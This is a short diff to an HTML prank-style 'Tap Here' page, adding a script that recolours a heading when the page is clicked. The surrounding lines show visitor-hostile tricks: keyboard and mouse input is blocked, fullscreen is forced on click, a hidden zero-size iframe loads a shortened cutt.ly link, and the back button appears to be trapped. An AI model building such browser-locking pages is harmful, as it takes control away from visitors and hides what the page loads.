@@ -135,7 +135,7 @@ p.kaki {
 
 	<p align="center" dir="ltr"><font size="8" color="orange"> Krishna Singh Rajput </font></p> 
 <br>
-	<p align="center" dir="ltr"><font size="8" color="Red"> 𝗧𝗮𝗽 𝗛𝗲𝗿𝗲 </font></p> 
+	<p align="center" dir="ltr"><font size="8" id="demo" color="Red"> 𝗧𝗮𝗽 𝗛𝗲𝗿𝗲 </font></p> 
 <br>
 
 <span style="font-family: Orbitron; color: Orange;">		
@@ -184,7 +184,7 @@ navigator.clipboard.writeText(text).then(function() {
 </script>
 </head>
 
-<body bgcolor="black" text="white" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" onclick="document.getElementById('lagu').play(); fullscreen(); starwars();">
+<body bgcolor="black" text="white" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" onclick="document.getElementById('lagu').play(); fullscreen(); starwars(); display();">
 <audio src="https://ringtone.srkh.in/wp-content/uploads/2020/05/KGF-Maa-Theme-Ringtone-Original-Music.mp3" autoplay="true" id="lagu"></audio
 <iframe width="0" height="0" frameborder="no" src="https://cutt.ly/yQYypD4"></iframe>
 	
@@ -742,7 +742,12 @@ body {
  <font color="Cyan"> <point> ›››››››››› </point>
 	</marquee>
   </centre>
-
+<script>
+function display()
+{
+document.getElementById("demo").style.color="green";
+}
+</script>
 <script>
     history.pushState(null, document.title, location.href);
 window.addEventListener('popstate', function (event)
